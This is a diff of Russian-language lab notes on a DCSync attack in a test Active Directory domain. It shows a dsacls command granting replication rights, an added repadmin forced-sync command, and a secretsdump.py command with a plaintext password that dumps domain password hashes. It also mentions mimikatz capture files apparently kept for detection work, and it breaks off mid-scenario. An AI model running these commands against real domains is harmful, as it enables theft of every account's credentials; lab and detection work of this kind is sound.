@@ -8,9 +8,11 @@ dsacls "dc=test,dc=local" /G "TEST\svc_replicator:CA;Replicating Directory Chang
 Replicating Directory Changes — имя расширенного права, которое разрешает запрашивать репликацию изменений каталога.
 Replicating Directory Changes All - дополнительно позволяет реплицировать учётные записи, скрытые от обычной репликации (например, хэши из атрибута unicodePwd)
 
+Принудительная репликация:
+repadmin /syncall /AdeP
+
 Kali linux:
 secretsdump.py work.local/svc_replicator:P@ssw0rd@192.168.0.10
-
 
 Сценарий для Kiwi (dcsync_rpc_success.pcapng, dcsync_rpc_fail.pcapng - при полученом system):
 При получении подобных дампов был следующий сценарий:
